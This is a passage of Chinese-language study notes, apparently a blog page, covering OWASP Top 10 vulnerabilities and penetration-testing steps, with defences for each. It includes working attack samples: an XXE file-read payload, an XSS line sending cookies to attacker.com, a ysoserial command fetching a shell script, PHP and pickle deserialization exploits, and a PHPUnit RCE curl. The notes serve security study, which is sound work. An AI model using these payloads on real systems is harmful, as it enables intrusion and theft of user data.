+<ul>
+<li>强制密码复杂度（长度+特殊字符）。</li>
+<li>多因素认证（MFA，如Google Authenticator）。</li>
+<li>会话管理：<ul>
+<li>使用安全的<code>HttpOnly</code> + <code>Secure</code> Cookie。</li>
+<li>登录后生成新Session ID。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="3-敏感数据泄露（Sensitive-Data-Exposure）"><a href="#3-敏感数据泄露（Sensitive-Data-Exposure）" class="headerlink" title="3. 敏感数据泄露（Sensitive Data Exposure）"></a><strong>3. 敏感数据泄露（Sensitive Data Exposure）</strong></h3><p><strong>数据暴露形式</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>数据类型</strong></th>
+<th align="left"><strong>风险案例</strong></th>
+<th align="left"><strong>防护措施</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>密码明文存储</strong></td>
+<td align="left">数据库泄露后直接获取用户密码</td>
+<td align="left">使用PBKDF2&#x2F;bcrypt强哈希+盐值</td>
+</tr>
+<tr>
+<td align="left"><strong>HTTP明文传输</strong></td>
+<td align="left">抓包获取Cookie（如未用HTTPS）</td>
+<td align="left">全站HTTPS + HSTS头</td>
+</tr>
+<tr>
+<td align="left"><strong>缓存泄露</strong></td>
+<td align="left">浏览器缓存敏感JSON响应（如信用卡号）</td>
+<td align="left">设置<code>Cache-Control: no-store</code></td>
+</tr>
+</tbody></table>
+<p><strong>工具检测</strong></p>
+<ul>
+<li><p><strong>Wireshark</strong>：抓包分析HTTP明文流量。</p>
+</li>
+<li><p><strong>Hashcat</strong>：破解弱哈希：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 0 hashes.txt rockyou.txt  <span class="comment"># MD5破解</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="4-XML外部实体注入（XXE）"><a href="#4-XML外部实体注入（XXE）" class="headerlink" title="4. XML外部实体注入（XXE）"></a><strong>4. XML外部实体注入（XXE）</strong></h3><p><strong>攻击步骤</strong></p>
+<ol>
+<li><p>上传恶意XML文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>服务器解析XML时返回<code>/etc/passwd</code>内容。</p>
+</li>
+</ol>
+<p><strong>防御方案</strong></p>
+<ul>
+<li><p>禁用DTD：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java示例</span></span><br><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用JSON替代XML。</p>
+</li>
+</ul>
+<p><strong>靶场</strong>：</p>
+<ul>
+<li>PortSwigger的XXE实验室。</li>
+</ul>
+<hr>
+<h3 id="5-失效的访问控制（Broken-Access-Control）"><a href="#5-失效的访问控制（Broken-Access-Control）" class="headerlink" title="5. 失效的访问控制（Broken Access Control）"></a><strong>5. 失效的访问控制（Broken Access Control）</strong></h3><p><strong>越权类型</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>类型</strong></th>
+<th align="left"><strong>示例</strong></th>
+<th align="left"><strong>测试方法</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>水平越权</strong></td>
+<td align="left">修改<code>/user?id=2</code>为<code>/user?id=1</code>访问他人数据</td>
+<td align="left">Burp Suite改参数重放请求</td>
+</tr>
+<tr>
+<td align="left"><strong>垂直越权</strong></td>
+<td align="left">普通用户直接访问<code>/admin/delete_user</code>接口</td>
+<td align="left">手动尝试管理URL</td>
+</tr>
+</tbody></table>
+<p><strong>防御方案</strong></p>
+<ul>
+<li><p>服务端校验权限：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Django示例</span></span><br><span class="line"><span class="keyword">if</span> request.user != <span class="built_in">object</span>.owner:</span><br><span class="line">    <span class="keyword">raise</span> PermissionDenied</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>日志记录敏感操作。</p>
+</li>
+</ul>
+<p><strong>测试方法</strong>：</p>
+<ul>
+<li>用Burp Suite修改请求参数测试水平&#x2F;垂直越权。</li>
+</ul>
+<hr>
+<h3 id="6-安全配置错误（Security-Misconfiguration）"><a href="#6-安全配置错误（Security-Misconfiguration）" class="headerlink" title="6. 安全配置错误（Security Misconfiguration）"></a><strong>6. 安全配置错误（Security Misconfiguration）</strong></h3><p><strong>常见问题</strong></p>
+<ul>
+<li><strong>服务器信息泄露</strong>：<ul>
+<li>响应头包含<code>Server: Apache/2.4.6 (Ubuntu)</code>。</li>
+</ul>
+</li>
+<li><strong>目录列表开启</strong>：<ul>
+<li>访问<code>http://example.com/images/</code>直接列出文件。</li>
+</ul>
+</li>
+<li><strong>默认账户未删除</strong>：<ul>
+<li>Tomcat默认密码<code>tomcat/s3cret</code>。</li>
+</ul>
+</li>
+</ul>
+<p><strong>检测工具</strong></p>
+<ul>
+<li><p><strong>Nikto</strong>：扫描配置漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://example.com</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="7-跨站脚本（XSS）"><a href="#7-跨站脚本（XSS）" class="headerlink" title="7. 跨站脚本（XSS）"></a><strong>7. 跨站脚本（XSS）</strong></h3><p><strong>攻击Payload</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>类型</strong></th>
+<th align="left"><strong>Payload示例</strong></th>
+<th align="left"><strong>利用效果</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>存储型XSS</strong></td>
+<td align="left"><code>&lt;script&gt;fetch(&#39;http://attacker.com/?c=&#39;+document.cookie)&lt;/script&gt;</code></td>
+<td align="left">窃取其他用户Cookie</td>
+</tr>
+<tr>
+<td align="left"><strong>反射型XSS</strong></td>
+<td align="left"><code>http://example.com/search?q=&lt;img src=x onerror=alert(1)&gt;</code></td>
+<td align="left">受害者点击链接后弹窗</td>
+</tr>
+<tr>
+<td align="left"><strong>DOM型XSS</strong></td>
+<td align="left"><code>#&lt;script&gt;alert(window.location.hash.slice(1))&lt;/script&gt;</code></td>
+<td align="left">前端JS动态解析导致执行</td>
+</tr>
+</tbody></table>
+<p><strong>防御方案</strong></p>
+<ul>
+<li><p>输出编码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$userInput</span>, ENT_QUOTES); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CSP头限制脚本源：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>工具</strong>：</p>
+<ul>
+<li><code>BeEF</code>（XSS利用框架）。</li>
+</ul>
+<hr>
+<h3 id="8-不安全的反序列化（Insecure-Deserialization）"><a href="#8-不安全的反序列化（Insecure-Deserialization）" class="headerlink" title="8. 不安全的反序列化（Insecure Deserialization）"></a><strong>8. 不安全的反序列化（Insecure Deserialization）</strong></h3><p>这一部分由于没有接触过，自己也不怎么会，仔细一点。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">OWASP反序列化备忘单</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">Java反序列化漏洞详解</a></li>
+</ul>
+<h4 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a><strong>1. 漏洞原理</strong></h4><p><strong>什么是序列化与反序列化？</strong></p>
+<ul>
+<li><p><strong>序列化（Serialization）</strong>：将对象转换为可存储或传输的格式（如JSON、二进制流）。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java示例：将User对象序列化为字节流</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">oos.writeObject(user);  <span class="comment">// 序列化</span></span><br><span class="line"><span class="type">byte</span>[] serializedData = bos.toByteArray();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>反序列化（Deserialization）</strong>：将序列化数据还原为对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java示例：反序列化字节流</span></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serializedData);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line"><span class="type">User</span> <span class="variable">deserializedUser</span> <span class="operator">=</span> (User) ois.readObject();  <span class="comment">// 反序列化</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>为什么反序列化不安全？</strong></p>
+<p>如果攻击者能控制反序列化的数据，可能触发以下恶意行为：</p>
+<ol>
+<li><strong>远程代码执行（RCE）</strong>：通过构造恶意对象调用危险方法（如<code>Runtime.exec()</code>）。</li>
+<li><strong>拒绝服务（DoS）</strong>：利用无限循环或大对象耗尽资源。</li>
+<li><strong>权限提升</strong>：篡改序列化数据伪造高权限身份。</li>
+</ol>
+<h4 id="2-攻击场景与漏洞利用"><a href="#2-攻击场景与漏洞利用" class="headerlink" title="2. 攻击场景与漏洞利用"></a><strong>2. 攻击场景与漏洞利用</strong></h4><p><strong>Java反序列化漏洞（经典案例）</strong></p>
+<p><strong>漏洞链：Apache Commons Collections ≤3.2.1</strong></p>
+<ol>
+<li><p><strong>攻击原理</strong>：</p>
+<ul>
+<li><p>库中的<code>InvokerTransformer</code>类允许通过反射调用任意方法。</p>
+</li>
+<li><p>攻击者构造链式调用执行系统命令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>利用工具</strong>：</p>
+<ul>
+<li><p><strong>ysoserial</strong>：生成Payload。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">&quot;curl http://attacker.com/shell.sh&quot;</span> &gt; payload.bin</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>发送Payload</strong>：<br>将<code>payload.bin</code>发送至目标服务器的反序列化接口。</p>
+</li>
+</ul>
+</li>
+</ol>
+<p><strong>PHP反序列化漏洞</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞代码：直接反序列化用户输入</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击者构造Payload执行系统命令</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Malicious</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;system(&#x27;id&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Malicious</span>);  <span class="comment">// 输出：O:9:&quot;Malicious&quot;:1:&#123;s:3:&quot;cmd&quot;;s:10:&quot;system(&#x27;id&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-检测与漏洞挖掘"><a href="#3-检测与漏洞挖掘" class="headerlink" title="3. 检测与漏洞挖掘"></a><strong>3. 检测与漏洞挖掘</strong></h4><p><strong>黑盒测试方法</strong></p>
+<ol>
+<li><strong>寻找反序列化入口点</strong>：<ul>
+<li>HTTP参数（如<code>data=</code>、<code>input=</code>）。</li>
+<li>文件上传（如<code>.ser</code>、<code>.bin</code>扩展名）。</li>
+<li>协议（如RMI、JMX、HTTP会话Cookie）。</li>
+</ul>
+</li>
+<li><strong>模糊测试（Fuzzing）</strong>：<ul>
+<li>发送畸形序列化数据观察异常响应。</li>
+<li>工具：<strong>Burp Suite</strong> + <strong>Java Deserialization Scanner</strong>插件。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白盒审计关键点</strong></p>
+<ol>
+<li><strong>危险函数&#x2F;类</strong>：<ul>
+<li>Java：<code>ObjectInputStream.readObject()</code>、<code>XMLDecoder.readObject()</code>。</li>
+<li>Python：<code>pickle.loads()</code>。</li>
+<li>PHP：<code>unserialize()</code>。</li>
+</ul>
+</li>
+<li><strong>依赖库检查</strong>：<ul>
+<li>使用<strong>OWASP Dependency-Check</strong>扫描已知漏洞库（如Commons Collections）。</li>
+</ul>
+</li>
+</ol>
+<h4 id="4-防御方案"><a href="#4-防御方案" class="headerlink" title="4. 防御方案"></a><strong>4. 防御方案</strong></h4><p><strong>代码层防护</strong></p>
+<ol>
+<li><p><strong>避免反序列化用户输入</strong>：</p>
+<ul>
+<li>使用JSON（如<code>Jackson</code>、<code>Gson</code>）或XML（禁用DTD）替代二进制序列化。</li>
+</ul>
+</li>
+<li><p><strong>白名单校验</strong>：</p>
+<ul>
+<li><p>Java：覆盖<code>ObjectInputStream.resolveClass()</code>限制可反序列化的类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(<span class="string">&quot;com.example.SafeClass&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized class&quot;</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>签名验证</strong>：</p>
+<ul>
+<li>对序列化数据签名，反序列化前校验完整性。</li>
+</ul>
+</li>
+</ol>
+<p><strong>架构层防护</strong></p>
+<ol>
+<li><strong>WAF规则</strong>：拦截包含恶意序列化特征的请求。</li>
+<li><strong>最小权限</strong>：运行反序列化服务的账户限制权限（如不能执行<code>/bin/sh</code>）。</li>
+</ol>
+<p><strong>语言特定建议</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>语言</strong></th>
+<th align="left"><strong>安全替代方案</strong></th>
+<th align="left"><strong>危险函数</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Java</td>
+<td align="left">Jackson&#x2F;Gson（JSON）</td>
+<td align="left"><code>readObject()</code></td>
+</tr>
+<tr>
+<td align="left">Python</td>
+<td align="left"><code>json.loads()</code></td>
+<td align="left"><code>pickle.loads()</code></td>
+</tr>
+<tr>
+<td align="left">PHP</td>
+<td align="left"><code>json_decode()</code></td>
+<td align="left"><code>unserialize()</code></td>
+</tr>
+</tbody></table>
+<h4 id="5-实战靶场与工具"><a href="#5-实战靶场与工具" class="headerlink" title="5. 实战靶场与工具"></a><strong>5. 实战靶场与工具</strong></h4><p><strong>实验环境</strong></p>
+<ol>
+<li><strong>WebGoat</strong>：包含Java反序列化挑战（<a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat">下载地址</a>）。</li>
+<li><strong>Vulnhub</strong>：机器如”Mr. Robot”含PHP反序列化漏洞。</li>
+</ol>
+<p><strong>自动化工具</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>工具</strong></th>
+<th align="left"><strong>用途</strong></th>
+<th align="left"><strong>示例命令</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>ysoserial</strong></td>
+<td align="left">生成Java反序列化Payload</td>
+<td align="left"><code>java -jar ysoserial.jar CommonsCollections5 &quot;id&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><strong>PHPGGC</strong></td>
+<td align="left">生成PHP反序列化Payload</td>
+<td align="left"><code>phpggc Monolog/RCE1 system &quot;id&quot; -f raw</code></td>
+</tr>
+<tr>
+<td align="left"><strong>Burp Suite插件</strong></td>
+<td align="left">检测Java&#x2F;Python反序列化点</td>
+<td align="left">安装”Java Deserialization Scanner”</td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="6-漏洞案例"><a href="#6-漏洞案例" class="headerlink" title="6. 漏洞案例"></a><strong>6. 漏洞案例</strong></h4><p><strong>CVE-2017-9841（PHPUnit RCE）</strong></p>
+<ul>
+<li><p><strong>漏洞原因</strong>：PHPUnit的<code>eval-stdin.php</code>文件允许反序列化用户输入。</p>
+</li>
+<li><p><strong>利用Payload</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">&quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot;</span> http://target/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>Log4j（CVE-2021-44228）</strong></p>
+<ul>
+<li><strong>关联性</strong>：通过JNDI注入触发反序列化（底层依赖序列化机制）。</li>
+</ul>
+<hr>
+<h4 id="7-高级绕过技巧"><a href="#7-高级绕过技巧" class="headerlink" title="7. 高级绕过技巧"></a><strong>7. 高级绕过技巧</strong></h4><p><strong>Java序列化绕过</strong></p>
+<ol>
+<li><strong>绕过黑名单</strong>：<ul>
+<li>使用冷门Gadget链（如<code>BeanShell1</code>、<code>ROME</code>）。</li>
+</ul>
+</li>
+<li><strong>利用本地类</strong>：<ul>
+<li>如果目标环境存在特定类（如Groovy、XStream），可构造新攻击链。</li>
+</ul>
+</li>
+</ol>
+<p><strong>Python pickle绕过</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 恶意Pickle数据（执行系统命令）</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&quot;id&quot;</span>,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit())</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-企业级防护建议"><a href="#8-企业级防护建议" class="headerlink" title="8. 企业级防护建议"></a><strong>8. 企业级防护建议</strong></h4><ol>
+<li><strong>SDLC集成</strong>：<ul>
+<li>在CI&#x2F;CD管道中扫描依赖库（如<code>OWASP Dependency-Check</code>）。</li>
+</ul>
+</li>
+<li><strong>运行时防护</strong>：<ul>
+<li>使用RASP（如<code>OpenRASP</code>）拦截反序列化攻击。</li>
+</ul>
+</li>
+<li><strong>红蓝对抗</strong>：<ul>
+<li>定期渗透测试，重点检查反序列化接口。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="9-使用含已知漏洞的组件（Using-Components-with-Known-Vulnerabilities）"><a href="#9-使用含已知漏洞的组件（Using-Components-with-Known-Vulnerabilities）" class="headerlink" title="9. 使用含已知漏洞的组件（Using Components with Known Vulnerabilities）"></a><strong>9. 使用含已知漏洞的组件（Using Components with Known Vulnerabilities）</strong></h3><p><strong>定义</strong>：依赖的库&#x2F;框架存在未修补漏洞（如Log4j）。<br><strong>防护</strong>：</p>
+<ul>
+<li>定期更新组件（<code>npm update</code>、<code>pip install --upgrade</code>）。</li>
+<li>使用SCA工具扫描（如<code>Dependabot</code>、<code>Trivy</code>）。</li>
+</ul>
+<hr>
+<h3 id="10-日志与监控不足（Insufficient-Logging-Monitoring）"><a href="#10-日志与监控不足（Insufficient-Logging-Monitoring）" class="headerlink" title="10. 日志与监控不足（Insufficient Logging &amp; Monitoring）"></a><strong>10. 日志与监控不足（Insufficient Logging &amp; Monitoring）</strong></h3><p><strong>定义</strong>：未能及时发现攻击行为，延长漏洞利用窗口。<br><strong>防护</strong>：</p>
+<ul>
+<li>记录关键操作（登录失败、敏感数据访问）。</li>
+<li>部署SIEM（如<code>Splunk</code>、<code>ELK</code>）实时告警。</li>
+</ul>
+<h3 id="如何利用OWASP-Top-10？"><a href="#如何利用OWASP-Top-10？" class="headerlink" title="如何利用OWASP Top 10？"></a>如何利用OWASP Top 10？</h3><ol>
+<li><strong>渗透测试</strong>：按Top 10清单逐项测试目标系统。</li>
+<li><strong>安全开发</strong>：在SDLC中嵌入对应防护措施。</li>
+<li><strong>合规审计</strong>：满足GDPR、PCI DSS等要求。</li>
+</ol>
+<p><strong>资源推荐</strong>：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/">OWASP官方文档</a></li>
+<li>PortSwigger的<a target="_blank" rel="noopener" href="https://portswigger.net/web-security">Web Security Academy</a>（免费实验室）</li>
+</ul>
+<h2 id="渗透测试标准流程（PTES标准-实战细化）"><a href="#渗透测试标准流程（PTES标准-实战细化）" class="headerlink" title="渗透测试标准流程（PTES标准 + 实战细化）"></a><strong>渗透测试标准流程（PTES标准 + 实战细化）</strong></h2><p><strong>涵盖从信息收集到报告撰写的全生命周期，适用于Web&#x2F;内网&#x2F;红队渗透。</strong></p>
+<hr>
+<h3 id="阶段-1：明确范围与规则"><a href="#阶段-1：明确范围与规则" class="headerlink" title="阶段 1：明确范围与规则"></a><strong>阶段 1：明确范围与规则</strong></h3><p><strong>1. 确定授权范围</strong></p>
+<ul>
+<li><strong>目标</strong>：IP&#x2F;域名、Web应用、API、内网设备。</li>
+<li><strong>限制</strong>：禁止DoS攻击、社会工程（除非明确允许）。</li>
+<li><strong>法律文书</strong>：签署《渗透测试授权书》。</li>
+</ul>
+<p><strong>2. 沟通测试方式</strong></p>
+<ul>
+<li><strong>黑盒测试</strong>：模拟外部攻击者（无内部信息）。</li>
+<li><strong>白盒测试</strong>：提供源码&#x2F;架构图（深度审计）。</li>
+<li><strong>灰盒测试</strong>：部分信息（如低权限账户）。</li>
+</ul>
+<hr>
+<h3 id="阶段-2：信息收集（Reconnaissance）"><a href="#阶段-2：信息收集（Reconnaissance）" class="headerlink" title="阶段 2：信息收集（Reconnaissance）"></a><strong>阶段 2：信息收集（Reconnaissance）</strong></h3><p><strong>1. 被动收集（无需直接交互）</strong></p>
+<ul>
+<li><p><strong>域名&#x2F;子域名</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subfinder -d example.com  </span><br><span class="line">amass enum -passive -d example.com  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>IP范围</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois example.com | grep <span class="string">&quot;NetRange&quot;</span>  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>历史漏洞</strong>：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cvedetails.com/">CVE Details</a></li>
+<li><a target="_blank" rel="noopener" href="https://web.archive.org/">Wayback Machine</a>（存档页面）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>2. 主动扫描（可能触发告警）</strong></p>
+<ul>
+<li><p><strong>端口扫描</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 -p- 192.168.1.1 -oN scan.txt  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Web目录爆破</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://example.com -w /path/to/wordlist.txt  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>指纹识别</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wappalyzer chrome插件 / whatweb http://example.com  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="阶段-3：漏洞扫描与利用"><a href="#阶段-3：漏洞扫描与利用" class="headerlink" title="阶段 3：漏洞扫描与利用"></a><strong>阶段 3：漏洞扫描与利用</strong></h3><p><strong>1. 自动化扫描（快速发现低垂果实）</strong></p>
+<ul>
+<li><p><strong>Web漏洞</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://example.com  </span><br><span class="line">nuclei -u http://example.com -t cves/  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>系统漏洞</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nessus / openvas 扫描IP段  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>2. 手动漏洞验证（关键步骤）</strong></p>
+<p><strong>Web类漏洞</strong></p>
+<ul>
+<li><p><strong>SQL注入</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com?id=1&quot;</span> --risk=3 --level=5  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>XSS</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>文件上传</strong>：<br>上传<code>.php</code>或<code>.jsp</code> Webshell，验证过滤机制。</p>
+</li>
+</ul>
+<p><strong>系统类漏洞</strong></p>
+<ul>
+<li><p><strong>未授权访问</strong>：</p>
+<ul>
+<li>Redis：<code>redis-cli -h 192.168.1.1 INFO</code></li>
+<li>Docker API：<code>curl http://192.168.1.1:2375/version</code></li>
+</ul>
+</li>
+<li><p><strong>RCE漏洞</strong>：</p>
